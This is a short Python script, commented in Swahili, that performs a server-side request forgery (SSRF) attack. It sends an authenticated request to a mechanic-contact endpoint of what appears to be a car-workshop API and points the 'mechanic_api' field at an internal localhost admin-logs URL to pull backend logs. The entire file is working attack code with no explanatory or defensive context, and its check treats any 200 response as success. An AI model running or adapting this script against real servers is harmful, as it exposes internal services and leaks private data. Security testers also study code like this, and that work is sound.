import requests

def run_ssrf(base_url, login_token):
    print("\n[*] Inazindua shambulio la SSRF...")
    target_url = f"{base_url}/workshop/api/merchant/contact_mechanic"
    headers = {"Authorization": f"Bearer {login_token}"}
    
    # Badala ya kuweka link ya fundi ya kawaida, tunaweka localhost ya ndani ya seva
    payload_data = {
        "mechanic_api": "http://localhost:8080/admin/all_backend_logs"
    }
    
    response = requests.post(target_url, json=payload_data, headers=headers)
    
    if response.status_code == 200 or "log" in response.text.lower():
        print("[+] UDHAIFU WA SSRF UGUNDULIWA! Seva imevujisha data za ndani kupitia mechanic_api.")
    else:
        print(f"[-] SSRF Imegomewa au Seva iko Salama. Code: {response.status_code}")
